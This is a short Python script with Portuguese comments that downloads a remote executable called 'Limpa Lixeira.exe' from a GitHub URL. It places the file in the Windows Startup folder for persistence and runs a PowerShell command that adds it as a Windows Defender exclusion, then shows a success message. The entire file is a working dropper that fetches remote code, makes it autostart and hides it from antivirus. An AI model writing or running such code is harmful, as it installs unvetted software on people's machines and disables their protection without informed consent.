import os
import urllib.request
import subprocess
import ctypes

# URL do arquivo no GitHub
url = "https://raw.githubusercontent.com/Diegoxy1/LimpaLixeira/main/Limpa%20Lixeira.exe"

# Caminho para salvar o arquivo baixado temporariamente
local_filename = os.path.join(os.getenv("TEMP"), "Limpa Lixeira.exe")

# Baixar o arquivo
urllib.request.urlretrieve(url, local_filename)

# Mover o arquivo para a pasta de inicialização
startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
destination = os.path.join(startup_folder, "Limpa Lixeira.exe")
os.replace(local_filename, destination)

# Adicionar o arquivo como exclusão no Windows Defender
def add_to_defender_exclusions(path):
    cmd = f"powershell -Command Add-MpPreference -ExclusionPath '{path}'"
    subprocess.run(cmd, shell=True, check=True)

add_to_defender_exclusions(destination)

# Mostrar uma mensagem de sucesso
ctypes.windll.user32.MessageBoxW(0, "O arquivo foi movido para a pasta de inicialização e adicionado como exclusão no Windows Defender.", "Sucesso", 0x40 | 0x1)
